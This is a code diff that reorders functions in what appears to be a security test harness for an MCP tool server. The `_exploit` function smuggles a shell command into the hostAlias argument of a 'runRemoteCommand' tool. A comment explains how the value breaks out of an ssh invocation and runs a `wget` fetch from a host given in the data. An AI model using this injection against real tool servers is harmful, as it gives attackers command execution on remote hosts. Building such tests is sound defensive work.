@@ -65,6 +65,16 @@ KEPT_PLACES: tuple[str, ...] = (
 AIM = re.compile(r'";')
 
 
+def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
+    async def run(places: Places, client: MCPClientPort) -> None:
+        host_alias = _injection(_snippet_for(places[place_id].coordinates))
+        await client.call_tool(
+            "runRemoteCommand", {"hostAlias": host_alias, "command": "echo probe"}
+        )
+
+    return run
+
+
 def _injection(snippet: str) -> str:
     # Break out of `ssh "<hostAlias>" "<command>"`: `ssh "nohost"` fails to stderr, `snippet`
     # runs to stdout, `true` forces exit 0, and `#` comments out the trailing `" "<command>"`.
@@ -85,16 +95,6 @@ def _snippet_for(coord: Coordinates) -> str:
         url = f"http://{coord.host}{coord.path}"
         return f"wget -qO- -T 8 '{url}'"
     raise ValueError(f"no command-execution snippet for kind {coord.kind}")
-
-
-def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
-    async def run(places: Places, client: MCPClientPort) -> None:
-        host_alias = _injection(_snippet_for(places[place_id].coordinates))
-        await client.call_tool(
-            "runRemoteCommand", {"hostAlias": host_alias, "command": "echo probe"}
-        )
-
-    return run
 
 
 async def _benign(places: Places, client: MCPClientPort) -> None:
